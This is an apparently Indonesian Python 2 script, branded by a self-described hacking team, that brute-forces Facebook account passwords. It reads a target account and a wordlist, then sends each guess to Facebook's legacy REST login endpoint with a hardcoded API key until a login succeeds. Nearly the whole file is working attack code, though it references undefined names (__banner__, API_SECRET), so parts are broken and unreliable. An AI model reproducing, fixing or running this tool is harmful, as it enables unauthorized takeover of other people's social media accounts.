## fbbrute.py - Facebook Brute Force
# -*- coding: utf-8 -*-
##
import os
import urllib
import hashlib
import os
import random
import sys
import time
from time import sleep
os.system('clear')
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)
print ('loading..')
sleep(0.1)
mengetik('\33[0;32m> \33[32;1m> \33[0;36m> \33[31;1m> \33[30;1m> \33[33;1m> \33[1;33m>] \33[31;1m100%')
os.system('clear')
sleep(0.1)
print
mengetik('\33[0;32mSELAMAT DATANG DI TOOL KAMI ANONYMOUS CYBER TEAM INDONESIA')
print
mengetik('\33[33;1mfbbrute terbaru new bug server tolong jangan diebar luaskan agar menjaga tool ini agar tidak cepat koid')
print
mengetik('\33[31;1mathor tidak bertanggung jawab bila terjadi hal yg tidak diinginkan dosa tanggung sendiri')
sleep(1)
os.system('clear')
print ("\33[31;1m__________  ___               ________  ________  ")
print ("\33[31;1m|         \ | |              |        | |       \ ")
print ("\33[31;1m|    ()   / | |              |  |TTTTTT |  (0)  / ")
print ("\33[31;1m|        /  | |        _____ |   IIIII| |      /  ")
print ("\33[31;1m|   ====    | |       |_____||  |IIIII  |   ===   ")
print ("\33[31;1m|         \ | |_____         |  |       |       \ ")
print ("\33[31;1m|    ()   / |       |        |  |       |  (0)  / ")
print ("\33[31;1m|________/  |_______|        |,,|       |_____ /  ")

print ("\33[31;1m===========================================")
print ("\33[0;32m|Author : BLACK-HORNET92                  |")
print ("\33[0;32m|       : YUDI                            |")
print ("\33[0;32m|version: 5.1 BLACKFB                     |")
print ("\33[0;32m|Team   : ANONYMOUS CYBER TEAM AINDONESIA |")
print ("\33[31;1m===========================================")
print
mengetik('                 \33[36;1mnow loading..........')
print ("\33[0;32m     ==============================")
print ("\33[1;33m         GUNAKAN WEBMASTER LITE  ")
print ("\33[1;33m       UNTUK MENGEDIT WORDLISNYA ")
print ("\33[1;33m              TERIMAKASIH        ")
print ("\33[0;32m     ==============================")

print("[+] Facebook Brute Force\n")
userid = raw_input("[*] Enter targetnya disini[Email|Phone|Username|ID]: ")
try:
	passlist = raw_input("[*] wordlist contoh password.txt: ")
	if os.path.exists(passlist) != False:
		print(__banner__)
		print(" [+] Account to crack : {}".format(userid))
		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
		print(" [+] Cracking, please wait ...")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:
				print("\n\n[+] Password found .. !!")
				print("\n[+] Password : {}".format(passwd.strip()))
				break
		print("\n\n[!] Done .. !!")
	else:
		print("fbbrute: error: No such file or directory")
except KeyboardInterrupt:
	print("fbbrute: error: Keyboard interrupt")
